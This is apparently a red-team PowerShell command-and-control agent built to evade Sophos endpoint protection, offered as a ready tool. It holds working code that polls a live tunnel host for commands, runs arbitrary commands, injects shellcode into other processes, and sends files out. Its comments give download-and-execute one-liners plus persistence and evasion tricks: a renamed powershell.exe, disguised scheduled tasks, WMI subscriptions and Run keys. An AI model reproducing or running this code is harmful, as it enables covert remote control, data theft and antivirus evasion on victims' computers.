# ============================================================================
#                    ENHANCED BITS C2 AGENT - FASTAPI VERSION
# ============================================================================
#
# PURPOSE:
#   Command & Control agent that bypasses Sophos Enterprise by using HTTP
#   (Invoke-RestMethod) instead of raw sockets. Connects to FastAPI C2 server.
#
# WHY IT BYPASSES SOPHOS:
#   - Uses Windows HTTP stack (WinHTTP/WinINET) via Invoke-RestMethod
#   - No raw socket creation (which Sophos monitors heavily)
#   - HTTP traffic blends with normal web browsing
#   - No files written to disk (fileless execution via IEX)
#
# AUTHOR: CyberXor Red Team
# DATE: December 2025
# TARGET: Sophos Enterprise Endpoint Protection
#
# ============================================================================
#                            CONFIGURATION
# ============================================================================

# C2 Server URL - FastAPI server running on attacker machine
# Change this to your server's IP address
 $ServerUrl = "https://attention-launches-kind-commonly.trycloudflare.com/bits"

# Unique Agent Identifier
# Format: COMPUTERNAME_USERNAME
# This makes each agent unique and identifiable in the C2 dashboard
$AgentId = $env:COMPUTERNAME + "_" + $env:USERNAME

# ============================================================================
#                        HOW TO RUN THIS AGENT
# ============================================================================
#
# METHOD 1: Standard Hidden Execution (Most Common)
# ------------------------------------------------
# Open cmd.exe or PowerShell and run:
#
# powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/enhanced_agent_fastapi.ps1'))"
#
# Breakdown of arguments:
#   -WindowStyle Hidden     : No PowerShell window appears
#   -ExecutionPolicy Bypass : Ignores script signing requirements
#   -NoProfile              : Doesn't load user profile (faster + cleaner)
#   -Command "..."          : Executes the provided command
#   IEX(...)                : Invoke-Expression - executes downloaded string
#   New-Object Net.WebClient: Creates HTTP client
#   .DownloadString(...)    : Downloads script as string
#
# ============================================================================
#
# METHOD 2: Renamed PowerShell (Evades Process Name Monitoring)
# -------------------------------------------------------------
# Sophos may monitor for "powershell.exe" processes. Rename it to evade:
#
# Copy-Item C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $env:TEMP\RuntimeBroker.exe -Force; & $env:TEMP\RuntimeBroker.exe -w hidden -ep bypass -nop -c "IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/enhanced_agent_fastapi.ps1'))"
#
# Alternative names that blend in:
#   - RuntimeBroker.exe    (legitimate Windows process)
#   - svchost.exe          (Windows service host)
#   - SearchIndexer.exe    (Windows Search)
#   - WmiPrvSE.exe         (WMI provider host)
#
# ============================================================================
#
# METHOD 3: Scheduled Task Persistence
# ------------------------------------
# Create a scheduled task that runs on login:
#
# schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/enhanced_agent_fastapi.ps1'))" /sc onlogon /ru %username%
#
# ============================================================================
#
# METHOD 4: WMI Event Subscription (Advanced Persistence)
# -------------------------------------------------------
# Survives reboots, runs when any process starts:
#
# $Command = 'powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString(''http://192.168.1.179:9000/enhanced_agent_fastapi.ps1''))"'
# $Filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name="Security"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"}
# $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{Name="Security"; ExecutablePath="cmd.exe"; CommandLineTemplate="/c $Command"}
# Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$Filter; Consumer=$Consumer}
#
# ============================================================================
#
# METHOD 5: Registry Run Key (Simple Persistence)
# ------------------------------------------------
# Add to registry for persistence:
#
# reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /t REG_SZ /d "powershell -w hidden -ep bypass -c \"IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/enhanced_agent_fastapi.ps1'))\"" /f
#
# ============================================================================

# ============================================================================
#                      PROCESS INJECTION FUNCTION
# ============================================================================
#
# This function injects shellcode into a remote process using Win32 API calls.
# It's used for the "inject <pid> <shellcode>" command.
#
# WARNING: This uses kernel32.dll APIs which may be hooked by Sophos.
# For better evasion, use syscall_v3.ps1 which uses direct NTDLL syscalls.
#
# PARAMETERS:
#   $Shellcode  : Byte array of shellcode to inject
#   $ProcessId  : PID of target process (e.g., explorer.exe)
#
# PROCESS:
#   1. OpenProcess       - Get handle to target process
#   2. VirtualAllocEx    - Allocate RWX memory in target
#   3. WriteProcessMemory - Write shellcode to allocated memory
#   4. CreateRemoteThread - Create thread to execute shellcode
#
# ============================================================================

function Inject-Shellcode {
    param(
        [byte[]]$Shellcode,    # Raw shellcode bytes
        [int]$ProcessId         # Target process ID
    )
    
    try {
        # ====================================================================
        # WIN32 API DEFINITIONS
        # ====================================================================
        # We use Add-Type to create a C# class that wraps the Win32 APIs.
        # This allows us to call native Windows functions from PowerShell.
        # ====================================================================
        
        $Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    // OpenProcess - Opens a handle to a process
    // Returns: Process handle (IntPtr) or Zero on failure
    // Parameters:
    //   dwDesiredAccess: Access rights (0x1F0FFF = PROCESS_ALL_ACCESS)
    //   bInheritHandle: Whether child processes inherit handle
    //   dwProcessId: Target process ID
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess, 
        bool bInheritHandle, 
        uint dwProcessId
    );
    
    // VirtualAllocEx - Allocates memory in another process
    // Returns: Address of allocated memory or Zero on failure
    // Parameters:
    //   hProcess: Handle to target process
    //   lpAddress: Preferred address (Zero = let system choose)
    //   dwSize: Size to allocate
    //   flAllocationType: MEM_COMMIT | MEM_RESERVE = 0x3000
    //   flProtect: PAGE_EXECUTE_READWRITE = 0x40
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, 
        IntPtr lpAddress, 
        uint dwSize, 
        uint flAllocationType, 
        uint flProtect
    );
    
    // WriteProcessMemory - Writes data to another process's memory
    // Returns: True on success
    // Parameters:
    //   hProcess: Handle to target process
    //   lpBaseAddress: Where to write
    //   lpBuffer: Data to write (our shellcode)
    //   nSize: Bytes to write
    //   lpNumberOfBytesWritten: Output - bytes actually written
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, 
        IntPtr lpBaseAddress, 
        byte[] lpBuffer, 
        uint nSize, 
        out int lpNumberOfBytesWritten
    );
    
    // CreateRemoteThread - Creates thread in another process
    // Returns: Thread handle or Zero on failure
    // Parameters:
    //   hProcess: Handle to target process
    //   lpThreadAttributes: Security attributes (Zero for default)
    //   dwStackSize: Stack size (0 = default)
    //   lpStartAddress: Thread start address (our shellcode)
    //   lpParameter: Parameter to pass (Zero)
    //   dwCreationFlags: 0 = run immediately
    //   lpThreadId: Output - new thread ID
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, 
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        IntPtr lpThreadId
    );
    
    // CloseHandle - Closes an open handle
    // Always close handles to prevent leaks
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
        
        # Compile the C# code at runtime
        Add-Type -TypeDefinition $Kernel32
        
        # ====================================================================
        # CONSTANTS
        # ====================================================================
        
        # PROCESS_ALL_ACCESS (0x1F0FFF)
        # Grants all possible access rights to the process
        $PROCESS_ALL_ACCESS = 0x1F0FFF
        
        # MEM_COMMIT (0x1000) - Commits the memory
        $MEM_COMMIT = 0x1000
        
        # MEM_RESERVE (0x2000) - Reserves virtual address space
        $MEM_RESERVE = 0x2000
        
        # PAGE_EXECUTE_READWRITE (0x40) - Memory can be read, written, executed
        # This is needed for shellcode execution
        $PAGE_EXECUTE_READWRITE = 0x40
        
        # ====================================================================
        # STEP 1: OPEN PROCESS
        # ====================================================================
        
        Write-Host "[*] Opening process $ProcessId..."
        $hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $ProcessId)
        
        if ($hProcess -eq [IntPtr]::Zero) {
            return "[-] Failed to open process $ProcessId (Access Denied or Invalid PID)"
        }
        Write-Host "[+] Got process handle: $hProcess"
        
        # ====================================================================
        # STEP 2: ALLOCATE MEMORY IN TARGET PROCESS
        # ====================================================================
        
        Write-Host "[*] Allocating $($Shellcode.Length) bytes in target process..."
        $remoteAddr = [Kernel32]::VirtualAllocEx(
            $hProcess, 
            [IntPtr]::Zero,                         # Let system choose address
            $Shellcode.Length, 
            ($MEM_COMMIT -bor $MEM_RESERVE),        # Commit and reserve
            $PAGE_EXECUTE_READWRITE                 # RWX permissions
        )
        
        if ($remoteAddr -eq [IntPtr]::Zero) {
            [Kernel32]::CloseHandle($hProcess)
            return "[-] Failed to allocate memory in process $ProcessId"
        }
        Write-Host "[+] Allocated memory at: 0x$($remoteAddr.ToString('X'))"
        
        # ====================================================================
        # STEP 3: WRITE SHELLCODE TO ALLOCATED MEMORY
        # ====================================================================
        
        Write-Host "[*] Writing shellcode to remote process..."
        $bytesWritten = 0
        $writeResult = [Kernel32]::WriteProcessMemory(
            $hProcess, 
            $remoteAddr, 
            $Shellcode, 
            $Shellcode.Length, 
            [ref]$bytesWritten
        )
        
        if (-not $writeResult) {
            [Kernel32]::CloseHandle($hProcess)
            return "[-] Failed to write shellcode to process $ProcessId"
        }
        Write-Host "[+] Wrote $bytesWritten bytes to remote process"
        
        # ====================================================================
        # STEP 4: CREATE REMOTE THREAD TO EXECUTE SHELLCODE
        # ====================================================================
        
        Write-Host "[*] Creating remote thread to execute shellcode..."
        $threadHandle = [Kernel32]::CreateRemoteThread(
            $hProcess, 
            [IntPtr]::Zero,  # Default security
            0,               # Default stack size
            $remoteAddr,     # Start at shellcode address
            [IntPtr]::Zero,  # No parameters
            0,               # Run immediately
            [IntPtr]::Zero   # Don't need thread ID
        )
        
        if ($threadHandle -eq [IntPtr]::Zero) {
            [Kernel32]::CloseHandle($hProcess)
            return "[-] Failed to create remote thread in process $ProcessId"
        }
        
        # ====================================================================
        # CLEANUP
        # ====================================================================
        
        Write-Host "[+] Remote thread created successfully!"
        [Kernel32]::CloseHandle($threadHandle)
        [Kernel32]::CloseHandle($hProcess)
        
        return "[+] Successfully injected shellcode into process $ProcessId"
    }
    catch {
        return "[-] Injection error: $($_.Exception.Message)"
    }
}

# ============================================================================
#                      PROCESS LIST FUNCTION
# ============================================================================
#
# Lists all running processes with useful information for target selection.
# Helps identify suitable injection targets (user-owned, not protected).
#
# Output columns:
#   PID  - Process ID (use this with 'inject' command)
#   NAME - Process name
#   CPU  - CPU time used
#   MEM  - Memory usage in MB
#
# Good injection targets:
#   - explorer.exe     (always running, user-owned)
#   - notepad.exe      (user-owned)
#   - OneDrive.exe     (user-owned)
#
# Bad injection targets:
#   - System processes (csrss, smss, wininit)
#   - Sophos processes (SophosFileScanner, etc.)
#   - Protected processes (lsass, etc.)
#
# ============================================================================

function Get-ProcessList {
    try {
        # Get all processes and select relevant properties
        # Sort by Working Set (memory) descending to show biggest first
        $procs = Get-Process | Select-Object Id, Name, CPU, WS | Sort-Object -Property WS -Descending
        
        # Build formatted output
        $output = "PID`tNAME`t`t`t`tCPU`tMEM`n"
        $output += "=" * 70 + "`n"
        
        foreach ($p in $procs) {
            # Convert Working Set to MB
            $ws = [math]::Round($p.WS / 1MB, 2)
            
            # Handle null CPU values
            $cpu = if ($p.CPU) { [math]::Round($p.CPU, 2) } else { "0" }
            
            # Pad name for alignment
            $name = $p.Name.PadRight(24).Substring(0,24)
            
            # Add line to output
            $output += "$($p.Id)`t$name`t$cpu`t${ws}MB`n"
        }
        return $output
    }
    catch {
        return "Error getting process list: $($_.Exception.Message)"
    }
}

# ============================================================================
#                           AGENT REGISTRATION
# ============================================================================
#
# On startup, the agent registers with the C2 server.
# This adds it to the list of connected agents in the dashboard.
#
# Endpoint: GET /bits/register?id={AgentId}
# Example:  GET http://192.168.1.179:8000/bits/register?id=DESKTOP-ABC_john
#
# ============================================================================

Write-Host "============================================"
Write-Host "   BITS C2 Agent - Sophos Bypass Edition"
Write-Host "============================================"
Write-Host "[*] Connecting to: $ServerUrl"
Write-Host "[*] Agent ID: $AgentId"

try {
    # Register with C2 server
    Invoke-RestMethod -Uri "$ServerUrl/register?id=$AgentId" -Method Get -UseBasicParsing | Out-Null
    Write-Host "[+] Successfully registered with C2 server"
    Write-Host "[+] Agent is now active and awaiting commands"
    Write-Host "============================================"
}
catch {
    Write-Host "[-] Registration failed: $($_.Exception.Message)"
    Write-Host "[-] Check that the C2 server is running"
    exit
}

# ============================================================================
#                           MAIN COMMAND LOOP
# ============================================================================
#
# The agent continuously polls the C2 server for commands.
# When a command is received, it's executed and the result is sent back.
#
# POLLING ENDPOINT: GET /bits/cmd/{AgentId}
#   - Returns: {"command": "..."} or {"command": ""} if no command
#   - Poll interval: 3 seconds (adjustable)
#
# RESULT ENDPOINT: POST /bits/result/{AgentId}
#   - Body: {"result": "command output..."}
#
# SUPPORTED COMMANDS:
#   ps                              - List all processes
#   inject <pid> <base64_shellcode> - Inject shellcode into process
#   download <filepath>             - Download file from target (base64)
#   upload <filepath> <base64data>  - Upload file to target
#   <any other command>             - Execute via Invoke-Expression
#
# ============================================================================

while ($true) {
    try {
        # ================================================================
        # POLL FOR COMMANDS
        # ================================================================
        
        $response = Invoke-RestMethod -Uri "$ServerUrl/cmd/$AgentId" -Method Get -UseBasicParsing
        $command = $response.command
        
        # Skip if no command pending
        if ($command -and $command -ne "") {
            Write-Host "[>] Received command: $command"
            
            # ============================================================
            # COMMAND: ps (Process List)
            # ============================================================
            if ($command -eq "ps") {
                $result = Get-ProcessList
            }
            
            # ============================================================
            # COMMAND: inject <pid> <base64_shellcode>
            # ============================================================
            # Example: inject 1234 /OiCAAAAYInlM...
            # Note: For better evasion, use syscall_v3.ps1 instead
            # ============================================================
            elseif ($command -match "^inject\s+(\d+)\s+(.+)$") {
                $pid = [int]$Matches[1]
                $b64Shellcode = $Matches[2]
                
                try {
                    # Decode base64 shellcode to bytes
                    $shellcode = [Convert]::FromBase64String($b64Shellcode)
                    $result = Inject-Shellcode -Shellcode $shellcode -ProcessId $pid
                }
                catch {
                    $result = "Failed to decode shellcode: $($_.Exception.Message)"
                }
            }
            
            # ============================================================
            # COMMAND: download <filepath>
            # ============================================================
            # Downloads a file from the target system
            # Returns file content as base64
            # Example: download C:\Users\victim\Desktop\secrets.txt
            # ============================================================
            elseif ($command -match "^download\s+(.+)$") {
                $filePath = $Matches[1]
                try {
                    if (Test-Path $filePath) {
                        # Read file as bytes and encode
                        $content = [System.IO.File]::ReadAllBytes($filePath)
                        $b64 = [Convert]::ToBase64String($content)
                        $result = "FILE_DOWNLOAD:$b64"
                    } else {
                        $result = "File not found: $filePath"
                    }
                }
                catch {
                    $result = "Download error: $($_.Exception.Message)"
                }
            }
            
            # ============================================================
            # COMMAND: upload <filepath> <base64content>
            # ============================================================
            # Uploads a file to the target system
            # Example: upload C:\temp\payload.exe SGVsbG8gV29ybGQ=
            # ============================================================
            elseif ($command -match "^upload\s+(.+?)\s+(.+)$") {
                $filePath = $Matches[1]
                $b64Content = $Matches[2]
                try {
                    # Decode base64 and write to file
                    $bytes = [Convert]::FromBase64String($b64Content)
                    [System.IO.File]::WriteAllBytes($filePath, $bytes)
                    $result = "File uploaded: $filePath"
                }
                catch {
                    $result = "Upload error: $($_.Exception.Message)"
                }
            }
            
            # ============================================================
            # DEFAULT: Execute via Invoke-Expression
            # ============================================================
            # Any other command is executed via PowerShell
            # Examples: whoami, ipconfig, dir, ls, netstat, etc.
            # ============================================================
            else {
                try {
                    $result = Invoke-Expression $command 2>&1 | Out-String
                }
                catch {
                    $result = "Error: $($_.Exception.Message)"
                }
            }
            
            # ============================================================
            # SEND RESULT BACK TO C2
            # ============================================================
            
            $body = @{ result = $result } | ConvertTo-Json
            Invoke-RestMethod -Uri "$ServerUrl/result/$AgentId" -Method Post -Body $body -ContentType "application/json" -UseBasicParsing | Out-Null
            Write-Host "[<] Result sent ($($result.Length) bytes)"
        }
    }
    catch {
        # Silently handle errors and continue
        # This prevents the agent from crashing on network issues
    }
    
    # ====================================================================
    # SLEEP INTERVAL
    # ====================================================================
    # 3 seconds is a good balance between responsiveness and stealth
    # Lower = more responsive but more network traffic
    # Higher = more stealthy but slower command execution
    # ====================================================================
    
    Start-Sleep -Seconds 3
}

# ============================================================================
#                           END OF AGENT
# ============================================================================
#
# SUMMARY:
# --------
# This agent provides a full C2 channel that bypasses Sophos by:
# 1. Using HTTP instead of raw sockets
# 2. Running fileless (no disk writes)
# 3. Blending with normal web traffic
#
# COMMANDS:
# ---------
# ps                    - List processes (find injection targets)
# inject <pid> <b64sc>  - Inject shellcode (or use syscall_v3.ps1)
# download <path>       - Exfil files from target
# upload <path> <b64>   - Upload files to target
# <any command>         - Execute PowerShell command
#
# EVASION TIPS:
# -------------
# 1. Run with renamed PowerShell (RuntimeBroker.exe)
# 2. Use -WindowStyle Hidden
# 3. Add -NoProfile for faster startup
# 4. For injection, use syscall_v3.ps1 (direct NTDLL)
#
# ============================================================================
